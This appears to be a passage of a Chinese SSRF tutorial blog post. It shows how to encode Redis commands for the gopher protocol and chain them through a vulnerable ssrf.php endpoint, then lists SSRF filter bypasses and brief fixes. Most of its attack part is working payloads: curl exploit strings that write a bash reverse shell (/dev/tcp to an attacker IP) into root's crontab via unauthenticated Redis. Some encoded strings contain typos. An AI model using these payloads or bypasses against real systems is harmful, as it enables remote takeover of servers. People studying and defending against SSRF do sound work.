&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211226121715508-2145005313.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211226121715508-2145005313.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;*1 #数组长度为1
$7 #多行字符串，长度为7
COMMAND #命令
*1 #数组长度为1
$4 #多行字符串，长度为7
info #返回字符串，文本行的集合。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;转换为 url 编码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;*1
$7
COMMAND
*1
$4
info


url encode：
*1%0A%247%0ACOMMAND%0A*1%0A%244%0Ainfo
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;(注意将%0A替换为%0D%0A)
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;*1%0D%0A%247%0ACOMMAND%0D%0A*1%%0D%0A%244%0D%0Ainfo
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;curl 构造请求&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl gopher://192.168.110.133:6379/_*1%0D%0A%247%0ACOMMAND%0D%0A*1%%0D%0A%244%0D%0Ainfo
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211226122258156-404912908.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211226122258156-404912908.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;说我们长度过长，我们重新换一个：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211226122541663-1781553001.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211226122541663-1781553001.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;*1%0D%0A%247%0D%0ACOMMAND%0D%0A*2%0D%0A%244%0D%0Aecho%0D%0A%243%0D%0A123
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到输出了 123。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211226122748239-805902371.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211226122748239-805902371.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;利用 redis 未授权访问攻击 redis&lt;/p&gt;
&lt;p&gt;攻击 redis 的 exp（这个其实利用的就是 redis 反弹 shell 的方式）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;test

set 1 &amp;quot;\n\n\n\n* * * * * root bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.110.133/4789 0&amp;gt;&amp;amp;1\n\n\n\n&amp;quot;
config set dir /etc/
config set dbfilename crontab
save

aaa
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从而捕获到数据，并进行转换：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211226124316159-1288822610.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211226124316159-1288822610.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;*1%0D%0A%247%0D%0ACOMMAND%0D%0A*3%0D%0A%243%0D%0Aset%0D%0A%245%0D%0Ashell%0D%0A%2464%0D%0A%0D%0A%0D%0A*%2F1%20*%20*%20*%20*%20%2Fbin%2Fbash%20-i%3E%26%2Fdev%2Ftcp%2F192.168.110.141%2F4789%200%3E%261%0D%0A%0D%0A%0D%0A*4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A%2Fvar%2Fspool%2Fcron%2F%0D%0A*4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A*1%0D%0A%244%0D%0Asave
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt; 

转换规则如下：

如果第一个字符是&amp;gt;或者&amp;lt;那么丢弃该行字符串，表示请求和返回的时间。

如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。

将r字符串替换成%0d%0a

空白行替换为%0a

结合gopher协议攻击内网redis，使用上边捕获数据的转换结果即可，然后进行反弹shell（192.168.1.4是存在redis未授权访问漏洞的服务器）：
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;curl -v &#39;http://192.168.1.124:8000/ssrf.php?url=gopher://192.168.1.4:6379/_*1 %250d %250a %248%250d %250aflushall %250d %250a %2a3 %250d %250a %243%250d %250aset %250d %250a %241%250d %250a1 %250d %250a %2464%250d %250a %250d %250a %250a %250a %2a %2f1 %20%2a %20%2a %20%2a %20%2a %20bash %20-i %20%3E %26%20%2fdev %2ftcp %2f121.36.67.230 %2f5555 %200%3E %261%250a %250a %250a %250a %250a %250d %250a %250d %250a %250d %250a %2a4 %250d %250a %246%250d %250aconfig %250d %250a %243%250d %250aset %250d %250a %243%250d %250adir %250d %250a %2416%250d %250a %2fvar %2fspool %2fcron %2f %250d %250a %2a4 %250d %250a %246%250d %250aconfig %250d %250a %243%250d %250aset %250d %250a %2410%250d %250adbfilename %250d %250a %244%250d %250aroot %250d %250a %2a1 %250d %250a %244%250d %250asave %250d %250aquit %250d %250a&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;curl -v &#39;http://192.168.1.124:8000/ssrf.php?url=gopher://192.168.1.4:6379/__*1%0D%0A%247%0D%0ACOMMAND%0D%0A*3%0D%0A%243%0D%0Aset%0D%0A%245%0D%0Ashell%0D%0A%2464%0D%0A%0D%0A%0D%0A*%2F1%20*%20*%20*%20*%20%2Fbin%2Fbash%20-i%3E%26%2Fdev%2Ftcp%2F192.168.110.141%2F4789%200%3E%261%0D%0A%0D%0A%0D%0A*4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A%2Fvar%2Fspool%2Fcron%2F%0D%0A*4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A*1%0D%0A%244%0D%0Asave&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt; 

构建Payload：

SSRF漏洞主机IP：192.168.0.2

Redis未授权主机IP：192.168.110.133

Kali linux攻击机器IP：192.168.110.141
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;curl -v &#39;http://192.168.0.2/ssrf.php?url=gopher://192.168.110.133:6379/_*1 %250d %250a %248%250d %250aflushall %250d %250a %2a3 %250d %250a %243%250d %250aset %250d %250a %241%250d %250a1 %250d %250a %2464%250d %250a %250d %250a %250a %250a %2a %2f1 %20%2a %20%2a %20%2a %20%2a %20bash %20-i %20%3E %26%20%2fdev %2ftcp %2f192.168.110.141 %2f6789 %200%3E %261%250a %250a %250a %250a %250a %250d %250a %250d %250a %250d %250a %2a4 %250d %250a %246%250d %250aconfig %250d %250a %243%250d %250aset %250d %250a %243%250d %250adir %250d %250a %2416%250d %250a %2fvar %2fspool %2fcron %2f %250d %250a %2a4 %250d %250a %246%250d %250aconfig %250d %250a %243%250d %250aset %250d %250a %2410%250d %250adbfilename %250d %250a %244%250d %250aroot %250d %250a %2a1 %250d %250a %244%250d %250asave %250d %250aquit %250d %250a&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;ssrf漏洞绕过方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssrf漏洞绕过方法&#34;&gt;#&lt;/a&gt; SSRF 漏洞绕过方法：&lt;/h1&gt;
&lt;p&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1.@　　　　　　　　　　http://abc.com@127.0.0.1

　　2.添加端口号　　　　　　http://127.0.0.1:8080

　　3.短地址　　　　　　　　https://0x9.me/cuGfD    推荐：http://tool.chinaz.com/tools/dwz.aspx、https://dwz.cn/

　　4.可以指向任意ip的域名　 xip.io               原理是DNS解析。xip.io可以指向任意域名，即127.0.0.1.xip.io，可解析为127.0.0.1

　　5.ip地址转换成进制来访问 192.168.0.1=3232235521（十进制） 

　　6.非HTTP协议

　　7.DNS Rebinding

　　8.利用[::]绕过         http://[::]:80/ &amp;gt;&amp;gt;&amp;gt; http://127.0.0.1

　　9.句号绕过         127。0。0。1 &amp;gt;&amp;gt;&amp;gt; 127.0.0.1

　　10.利用302跳转绕过   使用[https://tinyurl.com生成302跳转地址
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;https://tinyurl.xn--com302-u20k9dv69h8r7bzc7cjyd/)



@：
http://www.baidu.com@10.10.10.10 与 http?/10.10.10.10 请求是相同的

过滤绕过
IP地址转换成十进制：

127.0.0.1 先转换为十六进制  7F000001 两位起步所以 1就是01

7F000001转换为二进制
127.0.0.1=2130706433 最终结果
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1423858/202010/1423858-20201031182450845-1767037149.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1423858/202010/1423858-20201031182450845-1767037149.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1423858/202010/1423858-20201031182515515-597164973.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1423858/202010/1423858-20201031182515515-597164973.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;还有根据域名判断的，比如xip.io域名，就尝试如下方法

[xip.io](http://xip.io/)
[xip.io127.0.0.1.xip.io](http://xip.io127.0.0.1.xip.io/) --&amp;gt;127.0.0.1
[www.127.0.0.1.xip.io](http://www.127.0.0.1.xip.io/) --&amp;gt;127.0.0.1
[Haha.127.0.0.1.xip.io](http://haha.127.0.0.1.xip.io/) --&amp;gt;127.0.0.1
[Haha.xixi.127.0.0.1.xip.io](http://haha.xixi.127.0.0.1.xip.io/) --&amp;gt;127.0.0.1
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;72常见限制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#72常见限制&#34;&gt;#&lt;/a&gt; 7.2. 常见限制&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;限制为[http://www.xxx.com](http://www.xxx.com/) 域名**

采用http基本身份认证的方式绕过。即@
`http://www.xxx.com@www.xxc.com`

**2限制请求IP不为内网地址**

当不允许ip为内网地址时
（1）采取短网址绕过
（2）采取特殊域名
（3）采取进制转换

**限制请求只为http协议**

（1）采取302跳转
（2）采取短地址

# 
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;八-ssrf修复建议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#八-ssrf修复建议&#34;&gt;#&lt;/a&gt; 八、SSRF 修复建议&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;限制请求的端口只能为 Web 端口，只允许访问 HTTP 和 HTTPS 的请求。&lt;/li&gt;
&lt;li&gt;限制不能访问内网的 IP，以防止对内网进行攻击。&lt;/li&gt;
&lt;li&gt;屏蔽返回的详细信息。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211226122257716-1416179109.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211226122257716-1416179109.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
